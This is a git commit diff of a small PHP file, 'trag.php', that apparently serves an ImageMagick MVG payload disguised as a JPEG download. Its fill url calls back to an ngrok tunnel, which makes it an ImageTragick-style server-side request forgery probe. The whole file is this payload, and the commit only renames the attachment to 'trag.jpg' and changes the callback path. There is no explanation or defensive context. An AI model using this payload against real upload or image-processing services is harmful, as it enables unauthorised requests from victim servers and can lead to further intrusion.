c54aaf773b52670a7264bd7db576af6b99398952
missoum1307 <missoum1307@users.noreply.github.com>
2019-03-04 04:37:55 +0100

    Update trag.php

--- trag.php
+++ trag.php
@@ -1,8 +1,8 @@
 <?php 
-header('Content-Disposition: attachment');
+header('Content-Disposition: attachment; filename="trag.jpg"');
 header('Content-type: image/jpeg'); 
 ?>
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(https://ec9f1558.ngrok.io/ssrftra.jpg)'
+fill 'url(https://ec9f1558.ngrok.io/ssrftragic.jpg)'
 pop graphic-context
